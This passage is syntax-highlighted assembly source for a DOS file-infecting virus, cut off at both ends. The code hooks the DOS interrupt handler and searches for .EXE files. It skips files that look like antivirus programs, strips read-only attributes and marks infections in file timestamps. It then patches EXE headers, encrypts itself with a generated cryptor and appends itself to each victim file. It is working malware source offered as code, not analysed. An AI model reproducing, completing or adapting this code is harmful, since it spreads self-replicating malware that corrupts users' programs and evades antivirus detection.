</span><span class="sc5">@NoStop</span><span class="sc4">:</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@NoStop</span><span class="sc0">                 </span><span class="sc1">;Hang the computer</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc5">@New21</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">          </span><span class="sc1">;"Set DTA" service</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@DoIt</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc0">          </span><span class="sc1">;"Set default disk" service</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@DoIt</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">          </span><span class="sc1">;"Find first via file FCB" service</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@DoIt</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">713Bh</span><span class="sc0">        </span><span class="sc1">;"Set default dir" service (Win95)</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@DoIt</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2A77h</span><span class="sc0">        </span><span class="sc1">;"Get DOS date" ("Are we resident?")</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@OurCl</span><span class="sc0">
</span><span class="sc5">@Orig21</span><span class="sc4">:</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">            </span><span class="sc1">;Jump to original Int 21h handler</span><span class="sc0">
</span><span class="sc5">Ofs21</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">7777h</span><span class="sc0">
</span><span class="sc5">Seg21</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">7777h</span><span class="sc0">
</span><span class="sc5">@OurCl</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">@DoIt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Get default drive specification to al</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;Not drive A: or B:?</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">@NProt</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;Move drivespec to dl</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">           </span><span class="sc1">;Set drive.headspec to dh (dh:=0)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">        </span><span class="sc1">;ah:=SubFn(Write); al:=Sector count</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;ch:=Track(0-n); cl:=Sector(1-n)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">;es:=cs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">DtaOfs</span><span class="sc0">       </span><span class="sc1">;Offset of buffer into bx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">         </span><span class="sc1">;Read sector from disk to es:bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">        </span><span class="sc1">;ah:=SubFn(Write); al:=Sector count</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">         </span><span class="sc1">;Write same sector to same place</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">@NProt</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@YProt</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">@NProt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Get DTA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">;and store it</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">DtaOfs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Set DTA</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ExeMask</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">
</span><span class="sc5">@FndNxt</span><span class="sc4">:</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Find first/next .EXE file</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@DntInf</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">DtaOfs</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc0">       </span><span class="sc1">;Set si point to file attribute</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;Get file attribute</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;and store it into cl for later use</span><span class="sc0">

    </span><span class="sc6">lodsw</span><span class="sc0">               </span><span class="sc1">;Get file time</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11100000b</span><span class="sc0">        </span><span class="sc1">;Set FileTime.Sec=34</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00010001b</span><span class="sc0">        </span><span class="sc1">;to indicate infection</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">;File already possibly infected?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@NThis</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">FlTime</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">               </span><span class="sc1">;Get file date</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">FlDate</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">               </span><span class="sc1">;Get High(FileSize)</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">            </span><span class="sc1">;File smaller than 589824?</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">@NThis</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">;Store offset of 13-byte filespec</span><span class="sc0">

    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">AVir</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">@Infect</span><span class="sc4">-</span><span class="sc5">AVir</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">@NxtAv</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">scasw</span><span class="sc0">               </span><span class="sc1">;Is it Anti-Virus?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@NThis</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@NxtAv</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">;Copy file attribute into bx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">         </span><span class="sc1">;Strip "Read-only" bit</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">           </span><span class="sc1">;File not "Read-only"?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@NROnly</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Set file to not "Read-only"</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@NThis</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">;Set "File was Read-only" flag</span><span class="sc0">

</span><span class="sc5">@NROnly</span><span class="sc4">:</span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Open file for reading/writing</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@OpnErr</span><span class="sc0">         </span><span class="sc1">;Operation not successful</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;File handle into bx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@Infect</span><span class="sc0">         </span><span class="sc1">;Call "Infect file" procedure</span><span class="sc0">

</span><span class="sc5">@OpnErr</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">@NThis</span><span class="sc0">          </span><span class="sc1">;"File was Read-only" flag not set</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Restore original file attributes</span><span class="sc0">

</span><span class="sc5">@NThis</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">DtaOfs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@FndNxt</span><span class="sc0">         </span><span class="sc1">;Find next .EXE file</span><span class="sc0">

</span><span class="sc5">@DntInf</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Restore original DTA</span><span class="sc0">

</span><span class="sc5">@YProt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@Orig21</span><span class="sc0">         </span><span class="sc1">;Jump to original Int 21h</span><span class="sc0">

</span><span class="sc5">ExeMask</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AVir</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'F-SCTBAVVIVS'</span><span class="sc0">
</span><span class="sc1">;=============================================================================</span><span class="sc0">
</span><span class="sc5">@Infect</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">BufOfs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Read file header into buffer (ds:dx)</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@BdFile</span><span class="sc0">         </span><span class="sc1">;Windows executable</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Seek EOF, get filesize into dx:ax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">;Calculate 512-byte page count</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">;No partial page?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@NoPart</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;Page for partial page too</span><span class="sc0">
</span><span class="sc5">@NoPart</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;Page count ok?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@PCntOk</span><span class="sc0">
</span><span class="sc5">@BdSize</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">@BdFile</span><span class="sc4">:</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@Close</span><span class="sc0">
</span><span class="sc5">@PCntOk</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">;Size of partial page ok?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@BdSize</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">@LDiv</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;Divide FileSize by 16</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@LDiv</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Subtract HeaderSize/16</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">;Strip high bits to calculate ip</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">;Store new ip (used later in encryption)</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">@Start</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;Exchange header ss</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldSS</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;Exchange header cs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldCS</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">;Exchange header ip</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldIP</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8FFEh</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;Exchange header sp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldSP</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Calculate new filesize</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VirSize</span><span class="sc0"> </span><span class="sc9">MOD</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">@NoCr</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@NoCr</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;NB! (512 &gt;= VirSize &gt; 1024)</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Minimum memory required</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">AllSize</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@BdFile</span><span class="sc0">
</span><span class="sc5">@MinOk</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;Maximum memory required</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">@BdFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@Engine</span><span class="sc0">         </span><span class="sc1">;Generate Cryptor</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@Crypt</span><span class="sc0">          </span><span class="sc1">;Encrypt virus in buffer</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">BufOfs</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Write virus to end of file</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@Close</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
